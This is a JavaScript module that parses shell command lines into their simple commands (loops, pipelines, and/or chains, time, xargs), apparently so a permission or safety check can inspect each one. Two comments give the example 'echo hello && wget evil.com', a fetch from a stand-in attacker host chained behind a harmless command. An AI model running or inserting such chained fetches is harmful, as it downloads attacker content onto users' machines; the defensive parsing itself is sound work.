import { _ } from 'golgoth';
import { parse } from 'unbash';
import { extractCommandLineFromXargs } from './helpers/extractCommandLineFromXargs.js';

export let __;

/**
 * Extract all simple commands from a command line
 * @param {string} commandLine - The command line to parse
 * @returns {Array<string>} Array of simple commands
 */
export function extractSimpleCommands(commandLine) {
  const ast = parse(commandLine);

  const commands = __.extractCommandsFromStatements(commandLine, ast.commands);
  const hasCommands = commands.length > 0;
  return hasCommands ? commands : [commandLine];
}

__ = {
  /**
   * Extract commands from a list of statements
   * @param {string} commandLine - The full command line
   * @param {Array<object>} statements - Array of statement nodes
   * @returns {Array<string>} Array of commands
   */
  extractCommandsFromStatements(commandLine, statements) {
    return _.chain(statements)
      .map((statement) => __.extractFromNode(commandLine, statement.command))
      .flatten()
      .filter((cmd) => !cmd.startsWith('['))
      .value();
  },

  /**
   * Extract command text from a node
   * @param {string} commandLine - The full command line
   * @param {object} node - The AST node to extract from
   * @returns {string|Array<string>} The command text or array of commands
   */
  extractFromNode(commandLine, node) {
    const nodeType = node.type;

    // while true; do echo hello; done
    if (nodeType === 'While') {
      return __.extractFromWhile(commandLine, node);
    }

    // for i in a b c; do echo $i; done
    // for ((i=0; i<10; i++)); do echo $i; done
    if (nodeType === 'For' || nodeType === 'ArithmeticFor') {
      return __.extractCommandsFromStatements(commandLine, node.body.commands);
    }

    // echo hello && wget evil.com
    // echo hello | wget evil.com
    if (nodeType === 'AndOr' || nodeType === 'Pipeline') {
      return __.extractFromComplexCommand(commandLine, node);
    }

    const commandName = node.name.text;

    // time echo hello
    if (commandName === 'time') {
      return __.extractTextRange(commandLine, node.suffix[0].pos, node.end);
    }

    // xargs grep foo
    if (commandName === 'xargs') {
      const commandString = extractCommandLineFromXargs(commandLine, node);
      if (commandString === null) {
        return [];
      }
      return extractSimpleCommands(commandString);
    }

    // echo hello (simple Command node)
    return __.extractTextRange(commandLine, node.name.pos, node.end);
  },

  /**
   * Extract text from a range in the command line
   * @param {string} commandLine - The full command line
   * @param {number} startPos - Start position
   * @param {number} endPos - End position
   * @returns {string} Extracted text
   */
  extractTextRange(commandLine, startPos, endPos) {
    return commandLine.substring(startPos, endPos);
  },

  /**
   * Extract commands from while loop
   * @param {string} commandLine - The full command line
   * @param {object} node - The While node
   * @returns {Array<string>} Commands from condition and body
   */
  extractFromWhile(commandLine, node) {
    const clauseCommands = __.extractCommandsFromStatements(
      commandLine,
      node.clause.commands,
    );
    const bodyCommands = __.extractCommandsFromStatements(
      commandLine,
      node.body.commands,
    );
    return [...clauseCommands, ...bodyCommands];
  },

  /**
   * Extract commands from complex command (AndOr or Pipeline)
   * @param {string} commandLine - The full command line
   * @param {object} node - The AndOr or Pipeline node
   * @returns {Array<string>} All commands from the complex structure
   */
  extractFromComplexCommand(commandLine, node) {
    return _.chain(node.commands)
      .map((subCommand) => __.extractFromNode(commandLine, subCommand))
      .flatten()
      .value();
  },
};
